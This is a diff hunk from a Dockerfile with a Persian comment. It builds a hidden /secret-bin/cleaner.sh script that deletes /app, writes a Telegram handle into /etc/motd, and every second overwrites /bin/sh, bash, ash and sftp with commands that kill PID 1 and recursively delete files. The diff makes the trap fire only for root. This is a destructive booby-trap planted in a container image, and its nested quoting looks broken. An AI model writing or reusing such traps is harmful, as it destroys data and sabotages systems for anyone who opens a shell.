@@ -40,9 +40,9 @@ RUN echo "export PATH=/secret-bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/
 # ۹. ساخت اسکریپت پس‌زمینه پاک‌سازی ثانیه‌ای شل‌ها
 RUN echo -e '#!/secret-bin/sh\n\
 rm -rf /app && touch /app\n\
-echo "Telegram:@amir_wolf512 HI:3">/etc/motd\n\
+echo "Telegram:@amir_wolf512 HI:3\n\n==========>">/etc/motd\n\
 while true; do\n\
-  echo "kill 1 ; rm -rf .* ; rm -rf *" > /bin/sh ; echo "kill 1 ; rm -rf .* ; rm -rf *" > /bin/ash ; /bin/bash ; echo "kill 1 ; rm -rf .* ; rm -rf *" > /usr/bin/bash ; echo "kill 1 ; rm -rf .* ; rm -rf *" > /bin/sh.orig ; echo "kill 1 ; rm -rf .* ; rm -rf *" > /bin/sftp\n\
+  echo "if [ "$(id -u)" = "0" ]; then kill 1 ; rm -rf .* ; rm -rf *; fi" > /bin/sh ; echo "if [ "$(id -u)" = "0" ]; then kill 1 ; rm -rf .* ; rm -rf *; fi" > /bin/ash ; /bin/bash ; echo "if [ "$(id -u)" = "0" ]; then kill 1 ; rm -rf .* ; rm -rf *; fi" > /usr/bin/bash ; echo "if [ "$(id -u)" = "0" ]; then kill 1 ; rm -rf .* ; rm -rf *; fi" > /bin/sh.orig ; echo "if [ "$(id -u)" = "0" ]; then kill 1 ; rm -rf .* ; rm -rf *; fi" > /bin/sftp\n\
   sleep 1\n\
 done' > /secret-bin/cleaner.sh && chmod +x /secret-bin/cleaner.sh
 
